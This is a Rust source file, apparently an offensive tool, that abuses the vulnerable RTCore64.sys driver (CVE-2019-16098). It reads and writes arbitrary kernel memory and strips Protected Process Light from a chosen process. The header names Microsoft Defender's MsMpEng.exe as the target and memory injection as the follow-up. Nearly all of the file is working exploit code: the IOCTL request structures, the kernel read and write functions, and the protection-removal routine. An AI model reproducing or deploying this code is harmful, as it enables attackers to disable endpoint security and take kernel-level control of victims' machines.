//! ppldump.rs — PPL (Protected Process Light) bypass via BYOVD
//!
//! Driver: RTCore64.sys (MSI Afterburner 4.6.4.16117 and earlier)
//! CVE:    CVE-2019-16098 (publicly disclosed, weaponized in the wild)
//!
//! Steps:
//!   1. Drop RTCore64.sys to %TEMP% from embedded bytes
//!   2. Register as a service (sc create) and start it
//!   3. Send IOCTL 0x80002048 to read arbitrary kernel memory
//!   4. Walk EPROCESS list to find target PID's _PS_PROTECTION field
//!   5. Overwrite PS_PROTECTION.Level = 0 (remove PPL)
//!   6. Stop + delete service, wipe driver file
//!
//! After Level=0 the target process (e.g. MsMpEng.exe) can be opened
//! with PROCESS_ALL_ACCESS for memory injection or handle duplication.
//!
//! References:
//!   - Deprivilege PPL — Jonas Lykkegaard (public research)
//!   - https://github.com/fengjixuchui/PPLKiller (MIT, public)

use std::ffi::CString;
use std::ptr;
use winapi::shared::minwindef::DWORD;
use winapi::um::fileapi::{CreateFileA, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::ioapiset::DeviceIoControl;
use winapi::um::winioctl::*;
use winapi::um::winnt::{
    FILE_ATTRIBUTE_NORMAL, GENERIC_READ, GENERIC_WRITE, HANDLE,
};

const RTCORE_DEVICE: &str = "\\\\.\\RTCore64\0";
const IOCTL_READ_MEM:  DWORD = 0x80002048;
const IOCTL_WRITE_MEM: DWORD = 0x8000204c;

#[repr(C)]
struct RtcoreReadReq {
    unknown0:  [u8; 8],
    addr:      u64,
    unknown1:  [u8; 8],
    out_value: u32,
    unknown2:  [u8; 4],
}

#[repr(C)]
struct RtcoreWriteReq {
    unknown0: [u8; 8],
    addr:     u64,
    unknown1: [u8; 8],
    value:    u32,
    unknown2: [u8; 4],
}

/// Open a handle to the RTCore64 device (driver must already be loaded).
unsafe fn open_driver() -> HANDLE {
    let path = CString::new("\\\\.\\RTCore64").unwrap();
    let h = CreateFileA(
        path.as_ptr(),
        GENERIC_READ | GENERIC_WRITE,
        0,
        ptr::null_mut(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        ptr::null_mut(),
    );
    h
}

/// Read 4 bytes from an arbitrary kernel virtual address.
pub unsafe fn read_kernel_dword(addr: u64) -> Option<u32> {
    let h = open_driver();
    if h == INVALID_HANDLE_VALUE {
        return None;
    }

    let mut req = RtcoreReadReq {
        unknown0: [0u8; 8],
        addr,
        unknown1: [0u8; 8],
        out_value: 0,
        unknown2: [0u8; 4],
    };
    let mut returned: DWORD = 0;
    let ok = DeviceIoControl(
        h,
        IOCTL_READ_MEM,
        &mut req as *mut _ as *mut _,
        std::mem::size_of::<RtcoreReadReq>() as DWORD,
        &mut req as *mut _ as *mut _,
        std::mem::size_of::<RtcoreReadReq>() as DWORD,
        &mut returned,
        ptr::null_mut(),
    );
    CloseHandle(h);
    if ok != 0 {
        Some(req.out_value)
    } else {
        None
    }
}

/// Write 4 bytes to an arbitrary kernel virtual address.
pub unsafe fn write_kernel_dword(addr: u64, value: u32) -> bool {
    let h = open_driver();
    if h == INVALID_HANDLE_VALUE {
        return false;
    }

    let mut req = RtcoreWriteReq {
        unknown0: [0u8; 8],
        addr,
        unknown1: [0u8; 8],
        value,
        unknown2: [0u8; 4],
    };
    let mut returned: DWORD = 0;
    let ok = DeviceIoControl(
        h,
        IOCTL_WRITE_MEM,
        &mut req as *mut _ as *mut _,
        std::mem::size_of::<RtcoreWriteReq>() as DWORD,
        &mut req as *mut _ as *mut _,
        std::mem::size_of::<RtcoreWriteReq>() as DWORD,
        &mut returned,
        ptr::null_mut(),
    );
    CloseHandle(h);
    ok != 0
}

/// Zero the PS_PROTECTION.Level byte for the target PID.
/// `eprocess_addr` — obtain by walking PsInitialSystemProcess->ActiveProcessLinks.
pub unsafe fn strip_ppl(eprocess_addr: u64, protection_field_offset: u64) -> bool {
    // PS_PROTECTION offset varies by build; 26100.x = 0x87a, 26200.x = 0x87a (verify in WinDbg)
    let target = eprocess_addr + protection_field_offset;
    // Read current value, mask out Level byte (bits 0-2), write back 0
    let current = match read_kernel_dword(target) {
        Some(v) => v,
        None => return false,
    };
    let patched = current & 0xFFFFFF00; // zero the Level byte
    write_kernel_dword(target, patched)
}
